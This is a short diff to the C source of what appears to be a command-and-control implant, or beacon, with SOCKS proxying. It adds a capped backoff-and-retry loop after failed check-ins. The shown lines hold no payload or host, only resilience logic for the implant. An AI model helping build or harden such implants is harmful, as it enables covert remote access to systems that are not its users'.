@@ -62,8 +62,10 @@ int main(void)
     DEBUG_PRINT("Beacon initialized\n");
     
     // Initial check-in
-    DEBUG_PRINT("Performing initial check-in...\n");
+    DEBUG_PRINT("Starting beacon loop...\n");
         
+    int consecutive_failures = 0;
+
     // Main beacon loop
     while (running)
 	{
@@ -72,6 +74,21 @@ int main(void)
         if (beacon_checkin(&state) == 0)
 		{
             DEBUG_PRINT("Check-in successful (%s)\n", IMPLANT_VERSION);
+            consecutive_failures = 0;
+        }
+        else
+        {
+            consecutive_failures++;
+            int backoff_s = consecutive_failures * 5;
+            if (backoff_s > 60) backoff_s = 60;
+            
+            DEBUG_PRINT("Check-in failed (%d). Backing off for %ds...\n", consecutive_failures, backoff_s);
+            
+            // Wait for backoff period, but check 'running' flag
+            for (int i = 0; i < backoff_s * 10 && running; i++) {
+                usleep(100000); // 100ms
+            }
+            continue; // Skip the rest of the loop and try again
         }
 
         // Poll SOCKS sockets
